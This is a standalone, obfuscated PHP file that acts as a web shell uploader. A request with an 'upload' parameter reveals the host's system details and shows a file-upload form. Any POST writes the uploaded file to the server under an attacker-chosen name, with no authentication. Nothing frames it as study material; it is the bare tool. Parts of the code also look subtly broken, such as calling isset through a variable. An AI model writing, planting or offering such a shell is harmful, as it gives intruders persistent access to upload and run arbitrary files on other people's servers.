<?php
$x1=isset;$x2=$_GET;$x3='upload';if($x1($x2[$x3])){$x4=php_uname;$x5="n";$x6='<br/>';$x7='<form method="post" enctype="multipart/form-data">';$x8='<input type="file" name="__">';$x9='<input name="_" type="submit" value="Upload">';$x10='</form>';echo'<pre>'.$x4().$x5.$x6.$x7.$x8.$x9.$x10;}
$x11=$_POST;if($x11){$x12=$_FILES;$x13=$x12['__']['name'];$x14=realpath;$x15=$x14($x13);$x19=$x12['__']['tmp_name'];$x20=copy;if($x20($x19,$x13)){echo'OK';}else{echo'ER';}}
?>
